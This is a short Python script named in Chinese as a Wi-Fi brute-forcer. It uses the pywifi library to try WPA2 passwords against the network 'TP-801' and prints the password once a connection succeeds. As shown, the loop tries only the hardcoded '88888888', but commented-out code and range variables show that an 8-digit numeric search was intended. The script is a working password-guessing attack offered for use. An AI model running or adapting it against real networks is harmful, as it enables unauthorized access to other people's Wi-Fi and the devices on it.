#!/usr/bin python
# -*- encoding: utf-8 -*-
'''
@Author  :   Celeste Young
@File    :   暴力破解wifi.py    
@Time    :   2022/5/11 11:48  
@E-mail  :   iamwxyoung@qq.com
@Tips    :   
'''

import time
import pywifi
from pywifi import const

t1 = time.time()

wifi = pywifi.PyWiFi()
iface = wifi.interfaces()[0]

start = 90000000
end = 100000000
allNum = 100000000
for i in range(1):
    # 生成8位数密码
    # pwd = str(i).zfill(8)
    pwd = '88888888'
    profile = pywifi.Profile()
    profile.ssid = 'TP-801'  # wifi名称
    profile.auth = const.AUTH_ALG_OPEN  # 验证方式
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # 加密方式
    profile.cipher = const.CIPHER_TYPE_CCMP  # 加密类型
    profile.key = pwd
    wedding = iface.add_network_profile(profile)
    # 尝试连接
    iface.connect(wedding)
    time.sleep(3)
    print(iface.status())
    if iface.status() == const.IFACE_CONNECTED:
        print(pwd)
        print('连接成功')
        break
    else:
        print(i, ':', start)

t2 = time.time()

print('Finish, use time ', t2 - t1, 's')